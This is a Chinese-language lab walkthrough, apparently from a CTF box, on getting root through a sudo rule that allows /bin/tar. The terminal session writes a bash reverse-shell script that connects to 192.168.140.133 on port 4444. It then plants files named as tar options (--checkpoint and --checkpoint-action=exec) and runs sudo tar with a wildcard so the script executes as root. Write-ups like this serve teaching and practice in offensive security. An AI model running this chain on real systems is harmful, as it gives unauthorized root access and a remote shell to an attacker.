发现 lin 用户有 sudo 权限执行 /bin/tar

提权方法：利用 tar 的 --checkpoint 和 --checkpoint-action 参数

当 root 通过 sudo tar 执行某些操作时，tar 命令支持两个特殊参数：

–checkpoint=N：每处理 N 个文件触发一个检查点

–checkpoint-action=ACTION：到达检查点时执行指定的动作（如 exec=命令）

lin@ip-10-146-147-145:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-146-147-145:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-146-147-145:
    (root) /bin/tar

如果我们可以让 tar 命令在当前工作目录下执行，并且能控制文件名，就可以通过创建特定名称的文件，如 --checkpoint=1 和 --checkpoint-action=exec=sh shell.sh 来让 tar 执行任意命令

创建临时目录

lin@ip-10-146-147-145:~/Desktop$ cd /tmp
lin@ip-10-146-147-145:/tmp$ mkdir shell
lin@ip-10-146-147-145:/tmp$ cd shell

创建反弹 shell 脚本

lin@ip-10-146-147-145:/tmp/shell$ cat > shell.sh << 'EOF'
> #!/bin/bash
> bash -c "bash -i >& /dev/tcp/192.168.140.133/4444 0>&1"
> EOF
lin@ip-10-146-147-145:/tmp/shell$ cat shell.sh
#!/bin/bash
bash -c "bash -i >& /dev/tcp/192.168.140.133/4444 0>&1"
lin@ip-10-146-147-145:/tmp/shell$ chmod +x shell.sh

创建 tar 触发文件，并开始在本机监听端口

lin@ip-10-146-147-145:/tmp/shell$ touch -- "--checkpoint=1"
lin@ip-10-146-147-145:/tmp/shell$ touch -- "--checkpoint-action=exec=sh shell.sh"

触发提权

lin@ip-10-146-147-145:/tmp/shell$ sudo /bin/tar -cf archive.tar *
